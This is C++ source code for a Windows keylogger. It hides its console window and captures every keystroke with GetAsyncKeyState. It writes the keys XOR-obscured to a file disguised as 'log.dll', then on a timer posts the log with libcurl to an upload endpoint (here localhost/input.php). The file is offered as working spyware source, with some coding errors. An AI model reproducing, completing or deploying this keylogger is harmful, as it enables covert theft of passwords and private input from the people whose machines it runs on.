#include "main.h"

int Save(int _key, char *file);
void upload();
void timer();
void cURLWebCheck();
std::string XOR(std::string data, char keyToEncrypt[]);
bool fist1 = true;
std::string s2;
int timertime = 300;

int main() {
	HWND stealth; 
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	Sleep(10);

	auto future = std::async(timer);
	char i;
	while (true) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "log.dll");
			}
		}
	}
	timer();
	return 0;
}

std::string XOR(std::string data, char keyToEncrypt[]) {
	std::string xorstring = data;
	for (int i = 0; i < xorstring.size(); i++)
		xorstring[i] = data[i] ^ keyToEncrypt[i % (sizeof(keyToEncrypt) / sizeof(char))];
	return xorstring;

}

void timer() {
	std::cout << "Start\n";
	for (int i = 0; i<timertime; ++i)
	{
		#ifdef _DEBUG
		std::cout << (timertime - i) << '\n';
		#endif
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
	upload();
	cURLWebCheck();
}



int Save(int _key, char *file) {
	std::cout << _key << std::endl;
	char keyToEncrypt[3] = { '0x14', '0x14', '0x14' };
	Sleep(10);
	if (fist1 == true) {
		fist1 = false;
		std::cout << "first" << std::endl;
		std::ofstream OUTPUT_FILE;
		OUTPUT_FILE.open(file);
		if (_key == VK_SHIFT)
			OUTPUT_FILE << XOR("[SHIFT]", keyToEncrypt);
		else if (_key == VK_BACK)
			OUTPUT_FILE << XOR("[BACK]", keyToEncrypt);
		else if (_key == VK_LBUTTON)
			OUTPUT_FILE << XOR("[LBUTTON]", keyToEncrypt);
		else if (_key == VK_RETURN)
			OUTPUT_FILE << XOR("[RETURN]", keyToEncrypt);
		else if (_key == VK_ESCAPE)
			OUTPUT_FILE << XOR("[ESCAPE]", keyToEncrypt);
		else
			std::string s2;
		s2 = (char)_key;
		std::string data1 = XOR(s2, keyToEncrypt);
		OUTPUT_FILE << data1;

		OUTPUT_FILE.close();
	}
	else {
		std::cout << "nope" << std::endl;
		std::ofstream OUTPUT_FILE;
		OUTPUT_FILE.open(file, std::ios::binary);
		if (_key == VK_SHIFT)
			OUTPUT_FILE << XOR("[SHIFT]", keyToEncrypt);
		else if (_key == VK_BACK)
			OUTPUT_FILE << XOR("[BACK]", keyToEncrypt);
		else if (_key == VK_LBUTTON)
			OUTPUT_FILE << XOR("[LBUTTON]", keyToEncrypt);
		else if (_key == VK_RETURN)
			OUTPUT_FILE << XOR("[RETURN]", keyToEncrypt);
		else if (_key == VK_ESCAPE)
			OUTPUT_FILE << XOR("[ESCAPE]", keyToEncrypt);
		else
			std::string s2;
		s2 = (char)_key;
		std::string data1 = XOR(s2, keyToEncrypt).c_str();
		OUTPUT_FILE << data1;

		OUTPUT_FILE.close();
	}
	return 0;
}

void upload() {
	std::ifstream info("log.dll", std::ios::in | std::ios::binary);
	std::string data5;
	if (info.is_open()) {
		while (!info.eof()) {
			getline(info, data5);
		}

	}
	std::cout << data5 << std::endl;
	CURL *curl;
	CURLcode res;
	std::string data6 = "test";
	std::string dc = "data=" + data5;

	curl_global_init(CURL_GLOBAL_ALL);

	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost/input.php");
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, dc.c_str());
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
	timer();

}

void cURLWebCheck() {
	//Future
}